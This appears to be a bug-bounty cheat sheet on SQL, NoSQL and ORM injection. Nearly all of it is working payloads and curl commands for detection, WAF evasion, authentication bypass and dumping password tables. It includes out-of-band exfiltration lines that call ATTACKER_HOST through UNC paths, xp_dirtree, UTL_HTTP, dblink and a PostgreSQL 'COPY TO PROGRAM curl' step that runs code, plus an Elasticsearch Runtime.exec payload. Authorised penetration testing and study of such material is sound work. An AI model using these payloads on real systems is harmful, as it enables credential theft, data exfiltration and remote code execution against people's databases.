# SQL / NoSQL Injection (deep)

User input reaches a database query. Consistently pays High–Critical (data exfil, auth bypass, RCE).
Never trust an automated tool before a manual fingerprint.

## Where it lives
Any param reaching a query: `search`, `filter`, `sort`, `order`, `id`, `q`, `where`, `limit`, `offset`,
`category`, `date`; JSON body fields; GraphQL string args ([graphql.md](graphql.md)); ORM `order_by`/
`sort` (column injection); and **logged headers** (`X-Forwarded-For`, `User-Agent`, `Referer`) that hit a
query → **second-order** SQLi. Also multipart filenames and cookie values.

## Detection ladder (manual first)
```sql
'          "          `          \        -- provoke an error / 500 / different response
' OR '1'='1     ' OR 1=1-- -     ' OR 1=1#         -- boolean true
' AND '1'='2                                        -- boolean false (compare responses)
```
```sql
-- time-based blind (per DBMS) — the universal confirmer
' AND SLEEP(5)-- -                 MySQL/MariaDB
' AND pg_sleep(5)-- -              PostgreSQL
'; WAITFOR DELAY '0:0:5'-- -       MSSQL
' AND 1=dbms_pipe.receive_message('a',5)-- -   Oracle
```
```sql
-- UNION (find column count, then reflect)
' ORDER BY 5-- -                   -- increment until error → column count
' UNION SELECT NULL,NULL,NULL-- -  -- match count, swap NULLs for @@version / user()
' UNION SELECT NULL,@@version,NULL-- -
```
**Types:** in-band (error/UNION), blind (boolean/time), **second-order** (stored then triggered elsewhere),
out-of-band (DNS/HTTP exfil when blind + no output).

## WAF / filter bypass
```
/*!50000SELECT*/   SE/**/LECT   SeLeCt          -- inline comment / case
'%20OR%201=1       '+OR+1=1     '/**/OR/**/1=1  -- whitespace alternatives (%09 %0a %0c %0d /**/ +)
%27  %2527        (double-encode)   0x61646d696e (hex literal)   char(97,100,109,105,110)
' OR 1=1 LIMIT 1 -- -             -- trim to one row
OOB exfil (MySQL): ' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.OOB\\a'))-- -
```

## Escalate (prove impact)
- **Data exfil:** dump a real, sensitive table (users/emails/hashes) — show actual rows + DB version.
- **Auth bypass:** `admin'-- -` / `' OR 1=1 LIMIT 1-- -` into a login → session as admin.
- **File read:** MySQL `LOAD_FILE('/etc/passwd')`; MSSQL `OPENROWSET`.
- **→ RCE** (see [rce.md](rce.md)): MySQL `INTO OUTFILE`/UDF, MSSQL `xp_cmdshell`, PostgreSQL
  `COPY … TO PROGRAM` / `CREATE FUNCTION`, stacked queries where the driver allows.

## NoSQL injection (Mongo et al.)
```
Auth bypass (JSON body): {"username":{"$gt":""},"password":{"$gt":""}}
Extraction:              {"email":{"$regex":"^a"}}   (boolean/blind char-by-char)
Operator via query:      user[$ne]=x&pass[$ne]=x     (URL-encoded operators)
JS eval:                 {"$where":"sleep(3000)"}    (time-based confirm)
```

## ORM injection (when there's no raw SQL string to see)
ORMs prevent classic string-concat injection but reopen it in their own idioms — fingerprint the ORM
(stack trace, error phrasing, `X-Powered-By`) and try the framework-specific hole:
```
Django  .extra(where=[...]) / .raw() with unsanitized input; field lookups via user-controlled kwargs
Sequelize/Node  Op.* operators accepted straight from JSON body: {"id":{"$gt":0}} in a "safe" ORM call
Hibernate/JPA  HQL/JPQL injection distinct from SQL — string-built HQL with concatenated input
Rails/ActiveRecord  where("column = '#{input}'") string interpolation (vs. the safe ? placeholder form)
```
Also test **second-order** concretely: a field stored safely via the ORM (e.g., profile "display name")
but later concatenated unsafely into a *different*, raw admin-side query (search, report, export) that
doesn't go through the same ORM path — store the payload, then trigger the read-side feature.

## Tools (after manual fingerprint)
`sqlmap -u '…' --batch --risk=3 --level=5 --dbms=<db> --tamper=space2comment,between` — feed it the
confirmed DBMS + param. `ghauri` for cleaner blind. For GraphQL: extract the arg into a request template.

## Proof-of-impact bar
Real rows / DB version / auth bypass — **not** a bare error string (that's the N/A signal in
[validation.md](validation.md)). SQLi with data exfil = 8.6 High; unauth SQLi/→RCE = 9.8 Critical.

---

## SQLI VARIANT & ESCALATION ADDITIONS

### Non-Standard Injection Points
```bash
# Quote-less / numeric injection on integer params:
# (No quotes needed — inject directly into numeric context)
curl "https://target.com/api/items?id=1 AND 1=1--"
curl "https://target.com/api/items?id=1 AND SLEEP(0)--"  # time-based excluded per rules

# ORDER BY / sort parameter injection:
curl "https://target.com/api/items?sort=name;SELECT+SLEEP(0)--"
curl "https://target.com/api/items?orderby=(SELECT+1+FROM+(SELECT+SLEEP(0))x)--"
# Safe boolean test for ORDER BY:
curl "https://target.com/api/items?sort=name ASC"   # baseline
curl "https://target.com/api/items?sort=name DESC"  # compare response order
curl "https://target.com/api/items?sort=(CASE WHEN 1=1 THEN name ELSE price END)"

# JSON params as SQLi vectors:
curl -X POST https://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"sort":{"field":"name\"; SELECT 1--","direction":"asc"}}'

# LIMIT / OFFSET injection:
curl "https://target.com/api/items?limit=10 UNION SELECT 1,2,3--"
curl "https://target.com/api/items?page=1 UNION SELECT username,password,3 FROM users--"

# LIKE wildcard manipulation:
curl "https://target.com/api/search?q=%"        # match all
curl "https://target.com/api/search?q=a%27--"   # break out of LIKE condition
```

### OOB Exfiltration (when blind injection is confirmed)
```bash
# MySQL LOAD_FILE UNC path (requires FILE privilege):
curl "https://target.com/api/items?id=1 AND LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e,ATTACKER_HOST,0x5c5c))--"

# MSSQL xp_dirtree / xp_fileexist (triggers DNS/SMB OOB):
'; EXEC master..xp_dirtree '\\ATTACKER_HOST\share'--
'; EXEC master..xp_fileexist '\\ATTACKER_HOST\file'--

# Oracle UTL_HTTP:
' UNION SELECT UTL_HTTP.REQUEST('http://ATTACKER_HOST/'||user) FROM DUAL--

# PostgreSQL COPY TO PROGRAM (RCE — requires superuser):
'; COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER_HOST/$(id)'--

# PostgreSQL dblink (OOB exfil without superuser):
' UNION SELECT * FROM dblink('host=ATTACKER_HOST user=a password=a dbname=a', 'SELECT 1') AS t(x INT)--
```

### Second-Order (Admin Export/Report as Trigger)
```bash
# Pattern: poison a stored value → it gets concatenated raw in a later admin query
# 1. Register with a payload username:
# username = admin'--   or   username = admin' UNION SELECT password FROM users--
# 2. Wait for/trigger the admin-side raw report/export that reads usernames
# 3. Check the export output for SQL error or data exfil
# Highest-yield locations: admin dashboards, CSV exports, PDF reports, log views
```

### WAF Bypass Addendum
```bash
# Chunked Transfer-Encoding body split (WAF sees partial payload, app assembles it):
# Use Burp's chunked encoding extension or Transfer-Encoding: chunked manually

# HTTP Parameter Pollution to split the payload:
curl "https://target.com/api/items?id=1 UNI&id=ON SELECT 1,2--"

# MySQL inline comment injection (version-specific comments):
curl "https://target.com/api/items?id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2--"

# Case variation + comments:
curl "https://target.com/api/items?id=1 uNiOn/**/SeLeCt/**/1,2--"
```

### ORM Idiom Injections
```bash
# Hibernate HQL:
# Concatenation in HQL: "from User where name = '" + input + "'"
# Test with: ' OR '1'='1  (single quotes still work in HQL string literals)

# Sequelize Op.* from JSON body (Node.js):
curl -X POST https://target.com/api/users/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":"x"},"password":{"$ne":"x"}}'   # NoSQL variant
# For Sequelize literal injection:
-d '{"username":"admin","password":{"[Op.ne]":"wrongpass"}}'

# Prisma $queryRaw (direct SQL when used with template literals — safe with tagged templates):
# Test: does the app use Prisma.sql`` or raw string concat? Check via error messages

# ActiveRecord (Rails) interpolated where:
# Vulnerable: User.where("name = '#{params[:name]}'")
# Test: name=' OR '1'='1
# Safe: User.where(name: params[:name]) — parameterized

# PostgREST/Supabase filter injection:
curl "https://target.com/rest/v1/profiles?or=(id.eq.1,id.eq.2)&password=not.is.null"
curl "https://target.com/rest/v1/users?email=eq.admin@target.com"
# Supabase row-level security bypass via malformed filter:
curl "https://target.com/rest/v1/secrets?id=gt.0"  # dump all rows if RLS misconfigured
```

---

## NOSQL BREADTH (extends existing NoSQL section)

### MongoDB Extended Operators
```bash
# $where JavaScript execution:
curl -X POST https://target.com/api/login \
  -d '{"username":"admin","password":{"$where":"sleep(1000)"}}'
# Blind boolean extraction via $where:
-d '{"username":{"$where":"this.username.match(/^a/)"}}'

# $expr operator (MongoDB 3.6+):
-d '{"$expr":{"$eq":["$username","admin"]}}'

# GraphQL NoSQL injection (when GraphQL arguments pass to MongoDB):
{"query": "{ users(filter: {username: {_eq: \"admin\"}}) { password } }"}
# Or inject operators in GraphQL variables:
{"variables": {"filter": {"password": {"$ne": null}}}}
```

### Elasticsearch _search Query Injection
```bash
# Injecting into _search query via user-controlled field:
curl -X POST "https://target.com/es/_search" \
  -H "Content-Type: application/json" \
  -d '{
    "query": {
      "query_string": {
        "query": "* OR username:admin",
        "default_field": "content"
      }
    }
  }'
# script_fields for code execution (if scripting enabled):
-d '{"script_fields":{"exec":{"script":"Runtime.getRuntime().exec(\"id\")"}}}'
```

### DynamoDB Expression Injection
```bash
# FilterExpression injection when user controls the filter string:
curl -X POST https://target.com/api/items \
  -d '{"filter":"attribute_exists(adminFlag) OR begins_with(id,:prefix)"}'
# PartiQL injection (DynamoDB SQL-like queries):
curl -X POST https://target.com/api/query \
  -d '{"query":"SELECT * FROM users WHERE id = 1 OR 1=1"}'
```

---

## HEADER / COOKIE INJECTION POINTS (Second-Order SQLi)

```bash
# X-Forwarded-For → logged → SQL query (common in analytics/rate-limit tables):
curl https://target.com/api/data \
  -H "X-Forwarded-For: 1' UNION SELECT password FROM users--"

# User-Agent → logged → admin log viewer:
curl https://target.com/ \
  -H "User-Agent: Mozilla' UNION SELECT 1,username,password FROM users--"

# Referer → stored → report:
curl https://target.com/ \
  -H "Referer: https://evil.com' UNION SELECT 1,2,password FROM users--"

# Cookie values → SQL query:
curl https://target.com/ \
  -H "Cookie: session=VALID; preferences=' UNION SELECT 1,2,3--"

# Multipart filename → file processing DB entry:
curl -X POST https://target.com/upload \
  -F "file=@file.txt;filename=\"report' UNION SELECT 1,password FROM users-- .txt\""
```
